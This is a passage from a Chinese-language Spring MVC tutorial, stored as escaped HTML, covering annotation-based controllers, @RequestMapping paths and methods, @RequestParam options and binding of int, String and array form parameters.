class=&quot;hljs-string&quot;&gt;&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;viewResolver&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;prefix&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;/WEB-INF/jsps/&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;suffix&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;.jsp&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（4）自定义Controller类&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Controller&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/user&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;UserController&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;hello&quot;&lt;/span&gt;)&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String myHello() {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;hello&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（5）定义hello页面&lt;/strong&gt;&lt;br/&gt;  根据视图解析，需要在WEB-INF下面定义jsps文件夹，在里面定义一个hello.jsp&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;%@&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;language&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;java&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;contentType&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;pageEncoding&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;%&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Insert title here&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;欢迎访问SpringMVC&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（6）访问地址：http://localhost:8080/day63_SpringMVC_02/user/hello.do&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;h82&quot;&gt;&lt;span&gt;&lt;strong&gt;8.2、注解开发流程图&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;注解开发流程图如下：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbYTy.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h83requestmapping&quot;&gt;&lt;span&gt;&lt;strong&gt;8.3、RequestMapping&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;功能：请求映射&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;几种写法：&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;hello&quot;&lt;/span&gt;)&lt;/span&gt; -- 这种方式可以匹配任何的扩展名&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/hello.do&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(value=&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/hello.do&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(value=&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/hello.do&quot;&lt;/span&gt;,method=RequestMethod.GET)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(value=&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/hello.do&quot;&lt;/span&gt;,method=RequestMethod.POST)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(value=&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/hello.do&quot;&lt;/span&gt;, method={RequestMethod.GET,RequestMethod.POST})&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  浏览器直接访问、a标签都是get请求。&lt;br/&gt;  表单提交(指定post)、ajax指定post提交。&lt;br/&gt;  如果是get请求，写成了post浏览器会报405错误，如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbbQ3.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h84requestmapping&quot;&gt;&lt;span&gt;&lt;strong&gt;8.4、RequestMapping的根路径&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;code class=&quot;hljs kotlin&quot; readability=&quot;4&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/user&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;UserController&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;save&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String Save() {&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;update&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String Update() {&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;find&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String Find() {&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;访问地址：http:&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/items&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;  &lt;span class=&quot;hljs-title&quot;&gt;ItemsController&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;save&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String Save() {&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;update&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String Update() {&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;find&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String Find() {&lt;br/&gt;}&lt;br/&gt;访问地址：http:&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;演示：自定义根路径&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Controller&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/user&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;UserController&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;hello&quot;&lt;/span&gt;)&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String myHello() {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;hello&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;访问地址：http://localhost:8080/day63_SpringMVC_02/user/hello.do&lt;/p&gt;
&lt;h3 id=&quot;h85requestparam&quot;&gt;&lt;span&gt;&lt;strong&gt;8.5、RequestParam&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;  value：参数名字，即入参的请求参数名字，如&lt;code&gt;value=&quot;studentid&quot;&lt;/code&gt;表示请求的参数区中的名字为studentid的参数的值将传入。&lt;br/&gt;  required：是否必须，默认是true，表示&lt;code&gt;请求中一定要有相应的参数&lt;/code&gt;，否则将报400错误码。&lt;br/&gt;  defaultValue：默认值，表示如果&lt;code&gt;请求中没有同名参数时的默认值&lt;/code&gt;。&lt;br/&gt;示例如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;userList&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;@RequestParam(defaultValue=&lt;span class=&quot;hljs-string&quot;&gt;&quot;2&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-keyword&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;group&quot;&lt;/span&gt;,required=&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;) String groupid) &lt;/span&gt;{&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;、形参名称为groupid，但是这里使用&lt;span class=&quot;hljs-keyword&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;group&quot;&lt;/span&gt;限定参数名为&lt;span class=&quot;hljs-keyword&quot;&gt;group&lt;/span&gt;，所以页面传递参数的名必须为&lt;span class=&quot;hljs-keyword&quot;&gt;group&lt;/span&gt;。&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;、这里通过required=&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;限定groupid参数为必需传递，如果不传递则报&lt;span class=&quot;hljs-number&quot;&gt;400&lt;/span&gt;错误，由于使用了defaultvalue=&lt;span class=&quot;hljs-string&quot;&gt;&quot;2&quot;&lt;/span&gt;默认值，即使不传&lt;span class=&quot;hljs-keyword&quot;&gt;group&lt;/span&gt;参数它的值仍为&lt;span class=&quot;hljs-string&quot;&gt;&quot;2&quot;&lt;/span&gt;。&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;、所以页面不传递&lt;span class=&quot;hljs-keyword&quot;&gt;group&lt;/span&gt;也不会报错，如果去掉defaultvalue=&lt;span class=&quot;hljs-string&quot;&gt;&quot;2&quot;&lt;/span&gt;且定义required=&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;，则如果页面不传递&lt;span class=&quot;hljs-keyword&quot;&gt;group&lt;/span&gt;就会报错。&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;示例如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbQ6l.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;  &lt;code&gt;@RequestParam的作用：给传递的参数起别名。&lt;/code&gt;
&lt;h2 id=&quot;h9&quot;&gt;&lt;span&gt;&lt;strong&gt;9、封装参数&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;springmvc没有成员变量，那页面提交过来的参数该如何接收和进行传递呢？&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;答：把需要传递的参数对象放入方法里面，当你请求这个方法，向这个方法传递参数的时候，这个方法里面的对象会自动被创建，需要的参数会自动被封装到方法的对象里面。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;分析接受参数类型：&lt;/p&gt;
&lt;pre readability=&quot;5.5&quot;&gt;
&lt;code class=&quot;hljs dart&quot; readability=&quot;5&quot;&gt;基本类型&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;、&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;等基本类型。&lt;br/&gt;Pojo类型&lt;br/&gt;包装类型&lt;br/&gt;集合类型&lt;p&gt;Springmvc默认支持类型：&lt;br/&gt;HttpSession、HttpRequstServlet、Model等等。&lt;/p&gt;&lt;p&gt;Struts2参数封装：基于属性驱动封装。&lt;br/&gt;Springmvc参数封装：基于方法进行封装。&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h91int&quot;&gt;&lt;span&gt;&lt;strong&gt;9.1、封装int类型参数&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;页面传递的参数都是字符串。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;size&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;12&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;color&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blue&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/recieveInt.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;ID：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;id&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;recieveInt&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String recieveInt(Integer id) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(id);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;success&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;code&gt;标签input的name的属性值id要与方法的形式参数名称id相同。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;h92string&quot;&gt;&lt;span&gt;&lt;strong&gt;9.2、封装String类型参数&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;size&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;12&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;color&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blue&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/recieveString.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;姓名：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;recieveString&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String recieveString(String username) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(username);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;success&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h93&quot;&gt;&lt;span&gt;&lt;strong&gt;9.3、封装数组类型参数&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;分析：&lt;/strong&gt;&lt;code&gt;封装数组是批量删除时使用，使用checkbox复选框，其value属性必须有值。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;size&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;12&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;color&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blue&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/recieveArray.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;ID：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span 